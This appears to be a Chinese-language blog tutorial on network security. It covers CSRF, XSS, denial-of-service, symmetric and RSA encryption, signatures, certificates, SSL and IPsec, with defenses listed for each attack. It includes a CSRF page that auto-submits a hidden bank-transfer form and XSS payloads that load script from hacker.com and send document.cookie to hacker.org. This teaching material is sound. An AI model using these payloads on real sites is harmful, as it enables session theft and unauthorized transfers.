<!DOCTYPE html>
<html lang="en">

<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="description" content="高山仰止，景行行止。虽不能至，心向往之。">
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    
    精神的壳</title>
  
  <link rel="shortcut icon" href="/favicon.ico">
  
  <link rel="stylesheet" href="/css/style.css">
  
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
<link rel="alternate" href="/atom.xml" title="精神的壳" type="application/atom+xml">
</head></html>

<body>
  <main class="content">
    <section class="jumbotron">
  <div class="video">
    
    <div class="video-frame">
      <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
    </div>
    
    <div class="video-media">
      <video playsinline="" autoplay="" loop="" muted="" data-autoplay="" poster="/images/ocean/ocean.png"
        x5-video-player-type="h5">
        <source src="/images/ocean/ocean.mp4" type="video/mp4">
        <source src="/images/ocean/ocean.ogv" type="video/ogg">
        <source src="/images/ocean/ocean.webm" type="video/webm">
        <p>Your user agent does not support the HTML5 Video element.</p>
      </video>
      <div class="video-overlay"></div>
    </div>
    <div class="video-inner text-center text-white">
      <h1><a href="/">精神的壳</a></h1>
      <p></p>
      <div><img src="/images/hexo-inverted.svg" class="brand" alt="精神的壳"></div>
    </div>
    <div class="video-learn-more">
      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
    </div>
  </div>
</section>
<div id="landingpage">
  <section class="outer">
  <article class="articles">
    
    <h1 class="page-type-title"></h1>
    
    
    <article id="post-网络那些事之网络安全" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2020/02/06/网络那些事之网络安全/">网络那些事之网络安全</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2020/02/06/网络那些事之网络安全/" class="article-date">
  <time datetime="2020-02-06T07:09:10.000Z" itemprop="datePublished">2020-02-06</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <h2 id="网络安全的基本属性"><a href="#网络安全的基本属性" class="headerlink" title="网络安全的基本属性"></a>网络安全的基本属性</h2><ul>
<li>机密性：发送方加密，预定接收方解密</li>
<li>身份认证：发送方与预定接收方能确定彼此身份</li>
<li>完整性：信息不会被篡改，即使被篡改了也可以被检测出来</li>
</ul>
<h2 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h2><ul>
<li>映射（Mapping）：利用 ping 确定网络上运行主机的地址，再通过<strong>端口扫描</strong>依次尝试与每个端口建立 TCP 连接，找出主机在运行的服务</li>
<li>嗅探（sniffing）：在共享介质网络中，攻击方接收所有经过它的分组，层层解析后得到数据<br><img src="https://i.loli.net/2020/02/06/s8lqcjTVEtJ4f5M.png" alt="分组嗅探"></li>
<li>IP 欺骗：修改分组的源 IP 地址，冒充发送方</li>
<li>拒绝服务（DoS）：向接收方恶意泛洪分组，淹没接收方（带宽耗尽、资源耗尽）<br><img src="https://i.loli.net/2020/02/06/CearKxmuZjUF1fz.png" alt="DDoS"><br><img src="https://i.loli.net/2020/02/06/TgOkCnZjJm1BEwX.png" alt="反射DDos"></li>
<li>中间人攻击：对源主机伪装成目的主机，对目的主机伪装成源主机</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<p>因为浏览器在访问网站的时候会自动带上 cookie，攻击者通过发送跨站请求使用户在不知不觉中在另一个网站完成某种操作。这种攻击就称为 CSRF。</p>
<p><img src="https://i.loli.net/2020/06/04/svxj1aRo9idAtgK.png" alt="CSRF"></p>
<p>由此可见，要完成一次 CSRF，受害者需要经历一下两步：</p>
<ol>
<li>登录受信任网站 A，并在本地生成 Cookie。</li>
<li>在不登出 A 的情况下，访问危险网站 B</li>
</ol>
<p>举个例子：</p>
<p>银行网站 A，它以 post 请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php</code></p>
<p>危险网站B，它里面有一段 HTML代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">　　　　　　function steal()</span><br><span class="line">　　　　　　&#123;</span><br><span class="line">          　　　　 iframe = document.frames["steal"];</span><br><span class="line">　　     　　      iframe.document.Submit("transfer");</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">　　<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"steal()"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>　<span class="attr">action</span>=<span class="string">"http://www.myBank.com/Transfer.php"</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"1000"</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户先访问 A 再访问 B，那么点击了这个危险连接之后用户就少了 1000 块！因为访问 B 之前已经登录了 A，而 B 背地里暗搓搓地向 A 发出 post 请求，所以浏览器会带上 A 的 Cookie 去向 <code>http://www.mybank.com/Transfer.php</code> 发出请求，结果银行网站服务器收到请求后，认为这是一个转账操作，所以就立刻进行转账操作……</p>
<p>如何进行防护：</p>
<ul>
<li>为每个表单添加一个隐藏字段保存伪随机数 token，接收表单时先验证 token 合法性，这样攻击者就无法伪造 post 请求了</li>
<li>提交表单需要验证码。其实这样和用 token 差不多，只不过一个在明一个在暗</li>
<li>验证 Referer 头部</li>
</ul>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS 全称是 Cross site script，即跨站脚本，为避免与 CSS 混淆简称 XSS。</p>
<p>攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中。使别的用户访问页面都会执行相应的嵌入代码。从而盗取用户 cookie、对访问者进行病毒侵害的一种攻击方式。</p>
<p>把代码嵌入网页的场景其实很常见。想象一个这样的场景：用户在某个论坛回帖，他回复的内容就会嵌入到这个网页中去。如果服务器不对用户的输入做过滤，一旦回复的内容是一段有恶意的代码，这段代码就会影响所有访问这个网页的人。</p>
<h4 id="反射性-XSS"><a href="#反射性-XSS" class="headerlink" title="反射性 XSS"></a>反射性 XSS</h4><p>又称为非持久性跨站点脚本攻击，它是最常见的 XSS，特征是攻击者注入的数据反应在响应中。一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)</p>
<p>举个例子：正常情况下，用户访问 <code>http://example.org?search=hello</code> 会显示 search 参数的值即 “hello”。然而，一旦攻击者把这样的地址嵌入到网页中 <code>http://example.org?search=&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>，请求响应中就会包含并执行这样一段 js 代码 <code>&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>，一旦 xss.js 包含了恶意操作，用户信息就被泄露了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xss.js 文件中的代码</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line">img.src = <span class="string">'http://hacker.org/xss?cookie='</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie); <span class="comment">// 窃取用户 cookie</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="存储性-XSS"><a href="#存储性-XSS" class="headerlink" title="存储性 XSS"></a>存储性 XSS</h4><p>又称为持久型跨站点脚本。与反射性 XSS 靠用户点击触发不同，存储性 XSS 把攻击脚本存储在网页中，每次用户访问这个网页都会自动执行恶意代码进行攻击。</p>
<p>举个例子：用户在留言板中正常回复是这样的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">“text”</span> <span class="attr">name</span>=<span class="string">“content”</span> <span class="attr">value</span>=<span class="string">“这里是用户填写的数据”</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器把 value 储存在数据库中，这样每次用户访问这个页面都可以看到这条回复。而攻击者可以在 value 中填入以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">哈哈哈，有趣有趣</span><br><span class="line">&lt;script&gt;src=<span class="string">'http://hacker.com/xss.js'</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果服务器也把这段代码入库并且嵌入到网页，那么每当用户访问访问这条留言都会执行 xss.js 中的代码。</p>
<p>如何进行防护：</p>
<ul>
<li>设置 Cookie 的属性为 <code>Http only</code>，这样 js 就无法获取 Cookie 值</li>
<li>严格检查表单提交的类型。比如 age 字段一定要是数字</li>
<li>过滤或移除特殊的 HTML 标签，如 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code></li>
<li>对用户提交的数据就行 <code>Html Encode</code> 处理，将其转换为 HTML 实体字符的普通文本。比如 <code>&lt;</code> 转换为 <code>&amp;lt</code>，<code>&quot;</code> 转换为 <code>&amp;quot</code></li>
</ul>
<h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>拒绝服务攻击即是攻击者想办法让目标机器停止提供服务，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。</p>
<p>拒绝服务攻击问题一直得不到合理的解决，究其原因是因为网络协议本身的安全缺陷，从而拒绝服务攻击也成为了攻击者的终极手法。攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，不接收新的请求；二是使用IP欺骗，迫使服务器把非法用户的连接复位，影响合法用户的连接。</p>
<h4 id="SYN-洪水攻击"><a href="#SYN-洪水攻击" class="headerlink" title="SYN 洪水攻击"></a>SYN 洪水攻击</h4><p>SYN Flood 是一种广为人知的攻击，因为现在建立 TCP 连接都要经历都是采用三次握手所以对现代网络不太有效。</p>
<p>SYN Flood 攻击目前有两种方法，都与服务器没收到 ACK 有关。恶意用户可以跳过传送最后的 ACK 信息或者在 SYN 里通过欺骗来源 IP 地址，让服务器送 SYN-ACK 到假的 IP 地址，因此永不可能收到 ACK。大量半开状态的 TCP 连接占用了服务器全部资源，正常用户的访问被拒绝。</p>
<p>防御 SYN Flood 有几种简单的办法：</p>
<ol>
<li>缩短 SYN Timeout 时间：由于 SYN Flood 攻击的效果取决于服务器上保持的 SYN 半连接数，这个值等于 SYN 攻击的频度 × SYN Timeout，所以通过缩短 SYN 半连接状态的时间可以大大降低服务器压力。</li>
<li>设置 SYN Cookie：设置 SYN Cookie 就是给每一个请求连接的 IP 地址分配一个 Cookie，如果短时间内连续受到某个 IP 的重复 SYN 报文，就认定是受到了攻击，以后从这个 IP 地址发来的包会被丢弃。</li>
</ol>
<p>上述的两种方法只能对付比较原始的 SYN Flood，缩短 SYN Timeout 时间仅会在对方攻击频度不高的情况下生效，SYN Cookie 更依赖于对方使用真实的 IP 地址，如果攻击者以数万/秒的速度发送 SYN 报文，同时利用 SOCK_RAW 随机改写 IP 报文中的源地址，以上的方法将毫无用武之地。</p>
<h4 id="哈希洪水攻击"><a href="#哈希洪水攻击" class="headerlink" title="哈希洪水攻击"></a>哈希洪水攻击</h4><p>使用拉链法实现的 hash 表最坏情况下插入 n 个值的时间复杂度为 O(n^2)。既然如此，如果攻击者掌握了服务器使用的散列函数背后的实现原理，就可以轻易构建出一批具有相同散列码的值，让服务器把资源全部耗费在 hash 表的插入操作上。依 2011 年的实验数据，攻击一台基于 Java（Tomcat）的服务器时，仅仅需要 6KB/s 的流量就能打瘫一颗 Intel i7 处理器，1GB/s 的流量可以打瘫 100000 颗 Intel i7 处理器，性价比远超 TCP 半开连接等传统的拒绝服务攻击。</p>
<p>防御哈希洪水攻击：</p>
<ul>
<li>使用带密钥哈希算法：如果攻击者不能掌握散列函数所有细节，就不能给出一组频繁碰撞的键，也就无法发动哈希洪水攻击。如果在散列函数中加入一个秘密参数，每建一张哈希表就随机生成一个新的秘密参数。这样一来，即使是同样的内容，放在不同的表里也会产生完全不同的内存分配。这整个过程攻击者完全无法预测，即使发生碰撞，也是小概率的巧合，而不是黑客在主动控制，攻击也就不可能成立了。这个秘密参数称为哈希种子（Hash Seed），而这类使用哈希种子的哈希算法，我们称之为带密钥哈希算法（Keyed Hash Function）</li>
<li>换一种 hash 表的实现方式：JDK 8 使用了一种新的逻辑来构建 hash 表。当一个位置存储的元素个数小于8个时，仍然使用链表存储；当一个位置存储的元素个数大于等于8个时，改为使用平衡树来存储。这样就可以保证最差的插入时间是 O(nlogn) 了。为什么要设立“8个元素”这样一个限制呢？因为平衡树相比链表而言有着更高的开销，以及更散乱的内存布局（影响缓存命中率）。在正常情况下，哈希表的一个位置大约只会存储 1~4 个左右的元素，所以没有必要专门开一个平衡树来存储冲突的元素，对一些性能敏感的应用来说会造成显著的负面影响。</li>
</ul>
<h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><ul>
<li>明文：没有进过加密的数据</li>
<li>密文：进过加密算法加密的数据</li>
<li>加密、解密密钥：用于辅助加密、解密的参数</li>
</ul>
<p>按加密密钥与解密密钥是否相同，将加密算法分为两大类：<strong>对称加密</strong>（加解密钥相同）与<strong>非对称加密</strong>（每方有公开、私有两个密钥）</p>
<p>现代技术不是针对字母而是针对<strong>二进制位</strong>进行操作：</p>
<ul>
<li><p>对称加密</p>
<ul>
<li>流密码：密钥产生密钥流，由密钥流对数据流进行加解密。换言之，加密与解密使用的是同一个密钥<br><img src="https://i.loli.net/2020/02/07/HOK1XPzD7aq8Ckc.png" alt="流密码"></li>
<li><p>分组密码：将明文序列划分为若干长为 M 的明文组，各明文组利用长为 i 的密钥组变换得到若干长度为 N 的密文组。通常分组长度取 64 bits</p>
<p><img src="https://i.loli.net/2020/02/07/JOH4tvB5z1qgnU8.png" alt="Feistel分组密码"></p>
</li>
</ul>
</li>
<li>非对称加密：加密与解密需要两个不同的密钥</li>
</ul>
<h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><h4 id="分组密码例子：DES"><a href="#分组密码例子：DES" class="headerlink" title="分组密码例子：DES"></a>分组密码例子：DES</h4><p>DES：数据加密标准（Data Encryption Standand），本质是 16 轮的 Feistel 分组密码，分组长度为 64 bits，密钥长度为 56 bits，每轮产生一个 48 bits 的子密钥：</p>
<p><img src="https://i.loli.net/2020/02/07/KQu1WXrx9wV4Dfj.png" alt="DES加密"></p>
<p><img src="https://i.loli.net/2020/02/07/c9g7j84hTADVRG5.png" alt="子密钥生成"></p>
<p>IP 置换：把输入数据的<strong>排列顺序打乱</strong></p>
<h4 id="分组密码例子：AES"><a href="#分组密码例子：AES" class="headerlink" title="分组密码例子：AES"></a>分组密码例子：AES</h4><p>AES：高级加密标准（Advanced Encryption Standand），分组长度 128/192/256 bits，可提供 128/192/256 bits 密钥，循环次数在一定范围内可变，与 DES 相比安全得多。</p>
<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>公钥加密算法的需求：</p>
<ul>
<li>公钥加密 K<sub>B</sub><sup>+</sup> 和私钥解密 K<sub>B</sub><sup>-</sup> 要满足：K<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m</li>
<li>给定公钥 K<sub>B</sub><sup>+</sup>，不可能计算得到 K<sub>B</sub><sup>-</sup></li>
</ul>
<h4 id="非对称加密例子：RSA"><a href="#非对称加密例子：RSA" class="headerlink" title="非对称加密例子：RSA"></a>非对称加密例子：RSA</h4><p>任何信息在计算机中都以比特流的形式表示，每个比特流可以表示为一个唯一的整数，因此<strong>加密一个报文就等于加密一个整数</strong>。</p>
<p>RSA 公钥/私钥生成过程：</p>
<ol>
<li>选择 2 个大质数 p 和 q</li>
<li>计算 n = pq，z = (p-1)(q-1)</li>
<li>选择 e(e &lt; n)，使 e 与 z 互质</li>
<li>选择 d 使 ed mod z = 1</li>
<li>得到公钥 (n,e)，私钥（n,d）</li>
</ol>
<p>给定公钥 (n,e)和私钥(n,d)，RSA 加密过程：</p>
<ol>
<li>加密报文 m 时，计算 c = m<sup>e</sup> mod n</li>
<li>解密报文 c 时，计算 m = c<sup>d</sup> mod n</li>
</ol>
<p>总结：<strong>m = (m<sup>e</sup> mod n)<sup>d</sup> mod n = m<sup>ed</sup> mod n = m<sup>ed mod z</sup> mod n</strong></p>
<p>RSA 的公钥密钥是相对的，即可以用公钥加密私钥解密，也可以用私钥加密公钥解密：K<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m = K<sub>B</sub><sup>+</sup>(K<sub>B</sub><sup>-</sup>(m))</p>
<p>由于 RSA 运算强度超高，实际应用中几乎不可能用于加密大报文，所以常常与对称加密结合使用。即用 RSA 解决对称加密中密钥分发问题，再利用对称加密算法对数据进行加密。这种方式分发的密钥称为<strong>会话密钥</strong>。</p>
<h2 id="报文完整性"><a href="#报文完整性" class="headerlink" title="报文完整性"></a>报文完整性</h2><p>报文完整性也称为报文认证，目标有：</p>
<ul>
<li>证明报文确实来自<strong>声称的发送方</strong></li>
<li>验证报文<strong>没有被篡改</strong></li>
<li>预防报文的<strong>时间、顺讯、持有期被修改</strong></li>
</ul>
<p>对报文应用散列函数 H 得到一个<strong>固定长度</strong>的散列码。这个散列码称为<strong>报文摘要</strong>，相当于源报文的数字指纹，可以用于报文认证。</p>
<p><strong>常见的散列函数算法：</strong></p>
<ul>
<li>MD5：对任意长度的报文输入，计算输出 128 bits 散列值</li>
<li>SHA-1（Secure Hash Algorithm）：要求输入长度 &lt; 2<sup>64</sup>，计算输出 160 bits 散列值。速度较慢但是安全性高于 MD5</li>
</ul>
<p><img src="https://i.loli.net/2020/02/08/5nhQBRmlwc8ApJY.png" alt="报文认证"></p>
<p>这种报文认证方法虽然能验证报文完整性，但是无法解决否认（发送方不承认自己发送过某一报文）、伪造（接收方伪造一份报文并声称来自发送方）、篡改（接收方对收到的信息进行修改）等问题，由此衍生了现实中广泛使用的数字签名（Digital Signatures）技术</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是实现安全电子交易的核心技术之一，特点是：</p>
<ul>
<li>可验证性：可以验证发送方身份、报文是否被篡改</li>
<li>不可伪造性：接收方无法伪造报文</li>
<li>不可抵赖性：发送方无法否认曾经发送过这样一个报文</li>
</ul>
<p>要实现数字签名，必须依赖于加密技术。但是为了确保接收方不可能伪造报文，无法使用对称加密技术。</p>
<p>签名过程举例：Bob 作为发送方给 Alice 发消息</p>
<p><img src="https://i.loli.net/2020/02/08/piZw95RkYKrS8a4.png" alt="签名报文摘要"></p>
<p>经过加密的报文摘要称为<strong>报文认证码（MAC）</strong>，是基于密钥和消息摘要所获得的一个值，可用于数据源认证和完整性校验。</p>
<h2 id="密钥分发中心（KDC）"><a href="#密钥分发中心（KDC）" class="headerlink" title="密钥分发中心（KDC）"></a>密钥分发中心（KDC）</h2><p>解决两个实体在网上共享对称密钥的问题，由此引入“可信任的密钥分发中心（Key Distribution Center）”作为两实体间的中介。</p>
<p>KDC 本质上是一个服务器，每个使用共享密钥服务的用户都要在此注册一个专属密钥。</p>
<p>密钥分发举例：Alice 与 Bob 使用 KDC 为中介共享密钥，R 即是 Alice 与 Bob 间的会话密钥</p>
<p><img src="https://i.loli.net/2020/02/08/nlT748VJQMcCpHW.png" alt="密钥分发"></p>
<h2 id="认证中心（CA）"><a href="#认证中心（CA）" class="headerlink" title="认证中心（CA）"></a>认证中心（CA）</h2><p>CA 负责公钥分发（保证公钥的来源可信），实现特定实体与其公钥的绑定：</p>
<p>假设 Bob 在 CA 注册他的公钥信息：</p>
<ol>
<li>Bob 向 CA 提供身份证明</li>
<li>CA 创建绑定 Bob 身份及其公钥的证书</li>
<li>证书包含 CA 签名的 Bob 的公钥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/uBWcYDPXKn4Mepv.png" alt="CA认证"></p>
<p>Alice 想要得到 Bob 的公钥：</p>
<ol>
<li>获得 Bob 的公钥证书</li>
<li>应用 CA 的公钥解密，获得 Bob 的公钥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/SDnVh2NzTKMeAu5.png" alt="CA解密"></p>
<p>一张公钥证书包含的要素有：</p>
<ul>
<li>序列号：唯一发行号</li>
<li>持有人信息：机构名，机构公钥，签名算法</li>
<li>发行者信息</li>
<li>有效期：保证在这个时间内从 CA  获得的公钥是有效的</li>
<li>发行者数字签名</li>
</ul>
<p><img src="https://i.loli.net/2020/02/09/Zv6k1a8u2Oc3SCI.png" alt="公钥证书"></p>
<h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>安全套接字层（SSL）或传输层安全（TLS） 可作为基础协议栈的组成部分，对应用透明。使用 SSL 后，传送 的应用层数据会被加密：</p>
<p><img src="https://i.loli.net/2020/02/09/PpZgjnTwkQEJ5RN.png" alt="SSL/TLS"></p>
<p>所谓 HTTPS 就是套了一层 SSL 的 HTTP 协议，保证信息的机密性和完整性，提供服务器认证功能。</p>
<h3 id="SSL-通信概览"><a href="#SSL-通信概览" class="headerlink" title="SSL 通信概览"></a>SSL 通信概览</h3><p>以 Alice 向 Bob 建立一个 SSL 连接为例：</p>
<p>TCP 连接建立完成后，就要开始<strong>建立 SSL 连接</strong></p>
<ol>
<li>Alice 向 Bob 发送请求</li>
<li>Bob 回应他的公钥证书</li>
<li>Alice 获得 Bob 的公钥，利用这个公钥加密一个随机产生的主密钥 MS 表示为 EMS（加密过的主密钥）</li>
</ol>
<p>不同的加密操作使用不同的密钥会更安全（如：报文认证码 MAC 密钥与数据加密密钥），所以 SSL 会通过主密钥 MS <strong>派生出一组密钥</strong>：</p>
<ul>
<li>K<sub>c</sub>：加密客户端向服务器发送数据的密钥</li>
<li>M<sub>c</sub>：加密客户端向服务器发送数据的 MAC 密钥</li>
<li>K<sub>s</sub>：加密服务器向客户端发送数据的密钥</li>
<li>M<sub>s</sub>：加密服务器向客户端发送数据的 MAC 密钥</li>
</ul>
<p>SSL 将字节流<strong>分割</strong>为一系列记录，每个记录携带自己的 MAC。在 MAC 中有记录的<strong>序列号</strong>和<strong>一次性随机数</strong>，防止攻击者重排或重放记录。同时还要添加<strong>记录类型</strong>，防止攻击者伪造 TCP 断连，type=0 用于数据记录，type=1 用于断连。即：MAC = MAC(key, sequence||type||digest)</p>
<p><img src="https://i.loli.net/2020/02/09/Wp6jCXhdVsRDKr3.png" alt="SSL记录"></p>
<p>一次简化的 SSL 通信过程如下：</p>
<p><img src="https://i.loli.net/2020/02/09/UrEF6ADhgWdI8qj.png" alt="SSL通信过程"></p>
<h3 id="现实中的-SSL-协议栈"><a href="#现实中的-SSL-协议栈" class="headerlink" title="现实中的 SSL 协议栈"></a>现实中的 SSL 协议栈</h3><p>SSL 支持客户与服务器商定各自使用的<strong>密码组</strong>（加密算法及密钥），通常是客户端提供选项，服务器从中挑选。</p>
<p>SSL 不是一个单独的协议，而是两层共四个协议：</p>
<p><img src="https://i.loli.net/2020/02/10/3e8GhFqg5BADw1s.png" alt="SSL四协议"></p>
<ul>
<li>更改密码规格协议：负责更改当前连接的密码组，标志着当前加密策略的改变。ContentType = 20</li>
<li>警告协议：加密出错或握手失败时，为对方发送警告或直接中止当前连接。ContentType = 21</li>
<li>握手协议：确定 SSL 握手过程（商定加密算法，建立密钥，提供服务器证书认证）。ContentType = 22</li>
<li>记录协议：描述 SSL 记录格式，封装数据</li>
</ul>
<p><img src="https://i.loli.net/2020/02/10/slABwdEjWJz3MhL.png" alt="SSL记录"></p>
<h3 id="SSL-握手过程"><a href="#SSL-握手过程" class="headerlink" title="SSL 握手过程"></a>SSL 握手过程</h3><ol>
<li>客户端发送其支持的算法列表及客户端一次性随机数（nonce）</li>
<li>服务器选择算法并发回给客户：选择 + 证书 + 服务器一次性随机数</li>
<li>客户端验证证书提取服务器公钥，生成<strong>预主密钥</strong>，并利用服务器公钥加密预主密钥，发送给服务器</li>
<li>客户端与服务器基于预主密钥和一次性随机数分别独立计算加密密钥和 MAC 密钥（两方使用相同的算法，得到相同的密钥）</li>
<li>客户端发送一个针对所有握手过程的 MAC</li>
<li>服务器发送一个针对所有握手过程的 MAC</li>
</ol>
<p>SSL 完全建立之前所有信息都是明文传输的，这就很容易被有心人篡改其中内容，最后两步可以作为握手信息完整性认证。</p>
<h2 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a>IPsec</h2><p>IPsec 负责网络层安全，提供机密性，完整性，源认证，防重放攻击服务。IPsec 在网络层中的传输有两种模式：</p>
<ul>
<li>传输模式：IPsec 数据报的发送与接收都在端系统完成<br><img src="https://i.loli.net/2020/02/10/KcMzgYaHW9FmZnf.png" alt="IPsec传输模式"></li>
<li>隧道模式：边缘路由器是 IPsec 感知的，IPsec 数据报进入局域网前还原为普通 IP 数据报<br><img src="https://i.loli.net/2020/02/10/tKvBjaneT8SxqPi.png" alt="IPsec隧道模式"></li>
</ul>
<p>有两个协议提供 IPsec 服务：</p>
<ul>
<li>数据认证头协议（AH, Authentication Header）：提供源认证，完整性<ul>
<li>传输模式：<br><img src="https://i.loli.net/2020/02/11/YHNn6CbAxr58pGM.png" alt="传输模式AH记录"><br>下一个头：指向源 IP 数据报载荷中的头部信息，如 TCP 头、UDP 头</li>
<li>隧道模式：<br><img src="https://i.loli.net/2020/02/11/vjBYzwEKF8de9N2.png" alt="隧道模式AH记录"></li>
</ul>
</li>
<li>封装安全协议（ESP, Encapsulation Security Protocol）：提供源认证，完整性，机密性。实际应用中最为广泛，我们常用的 VPN 就是基于这种协议<ul>
<li>传输模式：<br><img src="https://i.loli.net/2020/02/11/AleEbu4oYGrnH6v.png" alt="传输模式ESP记录"></li>
<li>隧道模式：最重要最常见的 IPsec 实现<br><img src="https://i.loli.net/2020/02/11/HKMmj89w2WpdXG1.png" alt="隧道模式ESP记录"></li>
</ul>
</li>
</ul>
<h3 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h3><p>发送数据前，发送端到接收端之间需要建立安全关联 <strong>SA</strong>(Security Association)以定义对数据报的加密算法与密钥。两方均要维护 SA 的连接状态信息。换言之，IPsec 并不是简单的对 IP 的封装，IP 是无连接的，<strong>IPsec 是面向连接的</strong>：</p>
<p><img src="https://i.loli.net/2020/02/10/3IexuNEcTjdCKpv.png" alt="SA连接"></p>
<h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3><p>安全策略 <strong>SP(Security Policy)</strong> 定义了对什么样的数据流应用 IPsec。多条安全策略记录组成了安全策略数据库 SPD。服务器提取数据报关键信息填充到一个称为“选择符”（目标IP，源IP，传输层协议，源端口，目标端口）的结构中，利用选择符去搜索 SPD，检索匹配的 SP。</p>
<h2 id="虚拟专用网（VPN）"><a href="#虚拟专用网（VPN）" class="headerlink" title="虚拟专用网（VPN）"></a>虚拟专用网（VPN）</h2><p>专用网络：基于专属的网络设备、链路或协议建设的专门用途的网络。最大的好处就是安全，但是成本很高。</p>
